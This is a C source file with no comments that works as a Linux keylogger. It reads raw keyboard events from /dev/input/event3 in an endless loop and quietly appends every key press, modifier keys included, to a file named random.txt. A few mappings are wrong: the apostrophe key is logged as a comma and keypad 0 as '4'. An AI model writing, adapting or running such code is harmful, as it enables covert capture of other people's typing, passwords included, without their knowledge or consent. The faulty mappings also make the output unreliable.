#include <stdio.h> 
#include <fcntl.h> 
#include <poll.h> 
#include <unistd.h>
#include <stdlib.h> 
#include <linux/input.h> 
#include <errno.h> 
#include <string.h>
#include <signal.h> 
#include <linux/input-event-codes.h>

int main(){
	char device_path[] = "/dev/input/event3\0";  
	int device;
	int read_check;
	int timeout_ms = 5000; 
	FILE *fp; 
	struct input_event getData;    	

	device = open(device_path, O_RDONLY);
	if (device < 0){
		perror("Error opening file"); 
	}


	while (1){
		fp = fopen("random.txt", "a");
		read_check  = read(device, &getData, sizeof(struct input_event));
		if (read_check < 0){
			printf("%d\n", read_check);
			perror("read failure"); 
			exit(1);    		
		} 
		
		if (getData.value == 1)  
		switch (getData.code){
			case KEY_A: 
				fprintf(fp,"a"); 
				break;
			case KEY_Q: 
				fprintf(fp,"q"); 
				break; 
			case KEY_W:
				fprintf(fp,"w"); 
				break; 
			case KEY_E: 
				fprintf(fp,"e"); 
				break; 
			case KEY_R:
				fprintf(fp,"r"); 
				break; 
			case KEY_T: 
				fprintf(fp,"t"); 
				break; 
			case KEY_Y:
				fprintf(fp,"y");
				break; 
			case KEY_U: 
				fprintf(fp,"u"); 
				break; 
			case KEY_I:
				fprintf(fp,"i");
				break; 
			case KEY_O:
				fprintf(fp,"o");
				break; 
			case KEY_P:
				fprintf(fp,"p"); 
				break; 
			case KEY_LEFTBRACE: 
				fprintf(fp,"{");
				break; 
			case KEY_RIGHTBRACE: 
				fprintf(fp,"}"); 
				break; 
			case KEY_ENTER: 
				fprintf(fp,"ENTER");
				break; 
			case KEY_LEFTCTRL: 
				fprintf(fp,"LEFT CTRL"); 
				break; 
			case KEY_S: 
				fprintf(fp,"s"); 
				break; 
			case KEY_D:	
				fprintf(fp,"d"); 
				break; 
			case KEY_F: 
				fprintf(fp,"f"); 
				break; 
			case KEY_G: 
				fprintf(fp,"g"); 
				break; 
			case KEY_H: 
				fprintf(fp,"h"); 
				break; 
			case KEY_J:
				fprintf(fp,"j"); 
				break; 
			case KEY_K:
				fprintf(fp,"k");
				break; 
			case KEY_L:
				fprintf(fp,"l");  
				break; 
			case KEY_SEMICOLON: 
				fprintf(fp,";"); 
				break; 
			case KEY_APOSTROPHE:
				fprintf(fp,","); 
				break; 
			case KEY_GRAVE: 
				fprintf(fp,"`"); 
				break; 
			case KEY_LEFTSHIFT: 
				fprintf(fp,"LEFT SHIFT");
				break; 
			case KEY_BACKSLASH: 
				fprintf(fp,"\\"); 
				break; 
			case KEY_Z: 
				fprintf(fp,"z");
				break;  
			case KEY_X: 
				fprintf(fp,"x"); 
				break; 
			case KEY_C:
				fprintf(fp,"c"); 
				break; 
			case KEY_V:
				fprintf(fp,"v"); 
				break; 
			case KEY_B: 
				fprintf(fp,"b"); 
				break; 
			case KEY_N: 
				fprintf(fp,"n"); 
				break; 
			case KEY_M: 
				fprintf(fp,"m"); 
				break; 
			case KEY_COMMA: 
				fprintf(fp,","); 
				break; 
			case KEY_DOT: 
				fprintf(fp,"."); 
				break; 
			case KEY_SLASH: 
				fprintf(fp,"/"); 
				break; 
			case KEY_RIGHTSHIFT: 
				fprintf(fp,"RIGHT SHIFT"); 
				break; 
			case KEY_KPASTERISK:
				fprintf(fp,"*"); 
				break; 
			case KEY_LEFTALT: 
				fprintf(fp,"LEFT ALT"); 
				break; 
			case KEY_SPACE: 
				fprintf(fp," "); 
				break; 
			case KEY_CAPSLOCK: 
				fprintf(fp,"CAPS LOCK"); 
				break; 
			case KEY_F1: 
				fprintf(fp,"F1"); 
				break; 
			case KEY_F2: 
				fprintf(fp,"F2"); 
				break; 
			case KEY_F3: 
				fprintf(fp,"F3"); 
				break; 
			case KEY_F4: 
				fprintf(fp,"F4"); 
				break; 
			case KEY_F5: 
				fprintf(fp,"F5"); 
				break; 
			case KEY_F6:
 				fprintf(fp,"F6"); 
				break; 
			case KEY_F7: 
				fprintf(fp,"F7"); 
				break; 
			case KEY_F8:
				fprintf(fp,"F8"); 
				break; 
			case KEY_F9: 
				fprintf(fp,"F9"); 
				break; 
			case KEY_F10: 
				fprintf(fp,"F10"); 
				break; 
			case KEY_NUMLOCK: 
				fprintf(fp,"NUM LOCK"); 
				break; 
			case KEY_SCROLLLOCK: 
				fprintf(fp,"SCROLL LOCK"); 
				break; 
			case KEY_KP7:
				fprintf(fp,"7");
				break;  
			case KEY_KP8:
				fprintf(fp,"8"); 
				break; 
			case KEY_KP9: 
				fprintf(fp,"9"); 
				break; 
			case KEY_KPMINUS: 
				fprintf(fp,"-"); 
				break; 
			case KEY_KP4: 
				fprintf(fp,"4"); 
				break; 
			case KEY_KP5: 
				fprintf(fp,"5"); 
				break; 
			case KEY_KP6:
				fprintf(fp,"6"); 
				break; 
			case KEY_KPPLUS:
				fprintf(fp,"+"); 
				break; 
			case KEY_KP1: 
				fprintf(fp,"1"); 
				break; 
			case KEY_KP2: 
				fprintf(fp,"2"); 
				break; 
			case KEY_KP3: 
				fprintf(fp,"3"); 
				break; 
			case KEY_KP0: 
				fprintf(fp,"4"); 
				break;
			case KEY_KPDOT: 
				fprintf(fp,"."); 
				break; 
		}
		fclose(fp);  
	} 
} 
